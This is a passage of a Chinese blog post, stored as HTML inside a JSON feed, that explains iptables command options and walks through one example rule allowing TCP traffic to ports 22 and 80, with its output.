class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. -A  添加规则到规则链</span><br><span class=\"line\">2. -L  列出当前的过滤规则</span><br><span class=\"line\">3. -m  conntrack 运行过滤规则根据连接状态进行匹配</span><br><span class=\"line\">4. -p  连接的目标协议</span><br><span class=\"line\">5. --dport  规则的目标端口</span><br><span class=\"line\">6. -j 跳转的特定的目标，iptables一般允许4个目标</span><br><span class=\"line\">    - ACCEPT 接收数据包并停止本链规则匹配</span><br><span class=\"line\">    - REJECT 拒绝数据包并提醒发送者，停止规则继续匹配</span><br><span class=\"line\">    - DROP 静默扔掉数据包，停止规则继续匹配</span><br><span class=\"line\">    - LOG 记录数据包，继续运行本链中更多的规则</span><br><span class=\"line\"></span><br><span class=\"line\">7. --log-prefix 记录时，将文本放在日志信息前</span><br><span class=\"line\">8. --log-level 日志使用的系统日志级别，默认为7</span><br><span class=\"line\">9. -i 仅匹配来自特定接口的数据包</span><br><span class=\"line\">10. -I 插入一条规则</span><br><span class=\"line\">    -I INPUT 5 插入INPUT链，使其成为第5条规则</span><br><span class=\"line\"></span><br><span class=\"line\">11. -v 在输出中显示更多信息</span><br><span class=\"line\">12. -s --source - address[&#x2F;mask] 指定源地址&#x2F;掩码</span><br><span class=\"line\">13. -d --destination - address[&#x2F;mask] 指定目的地</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"三-常用命令解析\"><a class=\"markdownIt-Anchor\" href=\"#三-常用命令解析\">#</a> 三、常用命令解析</h3>\n<ul>\n<li>\n<p>参考博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8zMzgyNzM1Mjg2ZTA=\">https://www.jianshu.com/p/3382735286e0</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZnJhbmtiL3AvNzQyNzk0NC5odG1s\">https://www.cnblogs.com/frankb/p/7427944.html</span></p>\n</li>\n<li>\n<p>样例 1</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables -I INPUT -d xx.xx.xx.x -p tcp -m multiport --dports 22,80 -j ACCEPT</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Chain INPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\">ACCEPT     tcp  --  anywhere             xx.xx.xx.x.vultr.com  multiport dports ssh,http</span><br><span class=\"line\"></span><br><span class=\"line\">Chain FORWARD (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\"></span><br><span class=\"line\">Chain OUTPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br></pre></td></tr></table></figure>\n<p>分析</p>\n<p>向 <code>INPUT</code>  链中添加了一条规则，接收目标地址为本机地址，端口为 22/80 的数据包，源地址没有指定</p>\n</li>\n<li>\n<p>持久化保存规则 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2Fpc2hpcmVuc2hpL3AvMTEyMjc2NjMuaHRtbA==\">https://www.cnblogs.com/kaishirenshi/p/11227663.html</span></p>\n</li>\n</ul>\n<blockquote>\n<p>  我们的问题不在于电视为我们展示具有娱乐性的内容，而在于所有的内容都以娱乐的方式表现出来，这就完全是另外一回事了。</p>\n<p align=\"right\">——《娱乐至死》\n</blockquote>\n",
            "tags": [
                "linux"
            ]
        }
    ]
}